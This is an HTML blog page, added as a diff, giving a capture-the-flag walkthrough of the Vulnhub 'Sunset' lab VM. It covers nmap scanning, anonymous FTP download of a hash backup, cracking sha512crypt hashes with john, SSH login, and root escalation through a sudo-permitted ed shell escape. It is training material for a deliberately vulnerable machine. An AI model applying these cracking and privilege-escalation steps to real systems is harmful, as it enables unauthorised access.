@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Sunset
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Dec, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Sunset</a></li>
+        </ul>
+      </nav>
+<h3>Scanning:</h3>
+<ul>
+<li>Finding the machine on the network</li>
+</ul>
+<pre><code><span>Nmap scan report for 192.168.56.130
+Host is up (0.00021s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+
+</span></code></pre>
+<h3>More Scanning:</h3>
+<ul>
+<li>Getting more details</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.130
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 17:25 EST
+Nmap scan report for 192.168.56.130
+Host is up (0.00010s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     pyftpdlib 1.5.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 192.168.56.130:21
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+[SNIP]
+</span></code></pre>
+<h3>FTP:</h3>
+<ul>
+<li>Logging to ftp as Anonymous</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ftp 192.168.56.130
+Connected to 192.168.56.130.
+220 pyftpdlib 1.5.5 ready.
+Name (192.168.56.130:crazyeights): anonymous
+331 Username ok, send password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span></code></pre>
+<p>Downloading the only file:</p>
+<pre><code><span>ftp&gt; ls
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+226 Transfer complete.
+ftp&gt; get backup
+local: backup remote: backup
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+226 Transfer complete.
+1062 bytes received in 0.03 secs (39.7634 kB/s)
+</span></code></pre>
+<h4>Checking out backup:</h4>
+<pre><code><span>crazyeights@es-base:~$ file backup
+backup: ASCII text
+
+crazyeights@es-base:~$ cat backup 
+CREDENTIALS:                                                                                                                                                                                                       
+office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
+datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
+sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
+sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/ 
+</span></code></pre>
+<h4>Using john to crack the credentials:</h4>
+<ul>
+<li>The format of the hashes sha512crypt</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ john --format=sha512crypt  sunset_hash 
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sky              (sky)
+Warning: Only 39 candidates buffered for the current salt, minimum 64 needed for performance.
+Warning: Only 56 candidates buffered for the current salt, minimum 64 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 47 candidates buffered for the current salt, minimum 64 needed for performance.
+Warning: Only 49 candidates buffered for the current salt, minimum 64 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+Proceeding with incremental:ASCII
+cheer14          (sunset)
+</span></code></pre>
+<ul>
+<li>The credentials sky:sky are not for anything.</li>
+<li>Trying the credentials sunset:cheer14 on ssh</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ssh sunset@192.168.56.130
+</span></code></pre>
+<h4>Getting user.txt:</h4>
+<pre><code><span>sunset@sunset:~$ ls
+user.txt
+sunset@sunset:~$ cat user.txt 
+5b5b8e9b01ef27a1cc0a2d5fa87d7190
+</span></code></pre>
+<h3>Priv Esc:</h3>
+<ul>
+<li>Finding what the user can run with elevated privileges:</li>
+</ul>
+<pre><code><span>sunset@sunset:~$ sudo -l
+Matching Defaults entries for sunset on sunset:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sunset may run the following commands on sunset:
+    (root) NOPASSWD: /usr/bin/ed
+</span></code></pre>
+<ul>
+<li>Looking up ed:</li>
+</ul>
+<pre><code><span>NAME
+       ed - line-oriented text editor
+</span></code></pre>
+<ul>
+<li>Looking up ed on GTFObins</li>
+<li>It can be used to break out from restricted environments by spawning an interactive system shell.</li>
+</ul>
+<pre><code><span>ed
+!/bin/sh
+</span></code></pre>
+<h4>Getting root:</h4>
+<pre><code><span>sunset@sunset:~$ sudo ed
+!/bin/bash
+root@sunset:/home/sunset# cd /root
+</span></code></pre>
+<h5>Getting root flag:</h5>
+<pre><code><span>root@sunset:~# ls
+flag.txt  ftp  server.sh
+root@sunset:~# cat flag.txt 
+25d7ce0ee3cbf71efbac61f85d0c14fe
+</span></code></pre>
+<p>FIN.</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
